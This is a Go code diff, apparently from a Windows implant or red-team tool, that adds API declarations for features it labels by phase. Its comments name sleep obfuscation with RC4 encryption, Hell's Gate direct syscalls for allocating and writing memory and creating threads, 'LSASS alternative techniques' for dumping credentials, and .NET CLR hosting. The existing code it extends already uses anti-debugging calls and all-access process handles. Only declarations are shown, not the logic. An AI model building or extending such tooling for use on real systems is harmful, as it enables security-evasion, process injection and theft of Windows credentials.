@@ -9,6 +9,9 @@ const (
 	memCommit            uint32 = 0x1000
 	memReserve           uint32 = 0x2000
 	memRelease           uint32 = 0x8000
+	pageNoAccess         uint32 = 0x01
+	pageReadWrite        uint32 = 0x04
+	pageExecRead         uint32 = 0x20
 	pageExecuteReadWrite uint32 = 0x40
 	processAllAccess     uint32 = 0x1F0FFF
 	threadAllAccess      uint32 = 0x1F03FF
@@ -126,4 +129,21 @@ var (
 	procNtQueryInformationProcess  = modNtdll.NewProc("NtQueryInformationProcess")
 	procGetTickCount64             = modKernel32.NewProc("GetTickCount64")
 	procOutputDebugStringW         = modKernel32.NewProc("OutputDebugStringW")
+
+	// Sleep obfuscation (Phase 6)
+	modAdvapi32Sys        = windows.NewLazySystemDLL("advapi32.dll")
+	procSystemFunction032 = modAdvapi32Sys.NewProc("SystemFunction032") // RC4 encrypt/decrypt
+
+	// Hell's Gate — direct syscall support (Phase 7)
+	procNtProtectVirtualMemory = modNtdll.NewProc("NtProtectVirtualMemory")
+	procNtAllocateVirtualMemory = modNtdll.NewProc("NtAllocateVirtualMemory")
+	procNtWriteVirtualMemory    = modNtdll.NewProc("NtWriteVirtualMemory")
+	procNtCreateThreadEx        = modNtdll.NewProc("NtCreateThreadEx")
+
+	// LSASS alternative techniques (Phase 5)
+	procRtlReportSilentProcessExit = modNtdll.NewProc("RtlReportSilentProcessExit")
+	procNtDuplicateObject          = modNtdll.NewProc("NtDuplicateObject")
+
+	// .NET / CLR hosting (Phase 9)
+	procCLRCreateInstance = windows.NewLazyDLL("mscoree.dll").NewProc("CLRCreateInstance")
 )
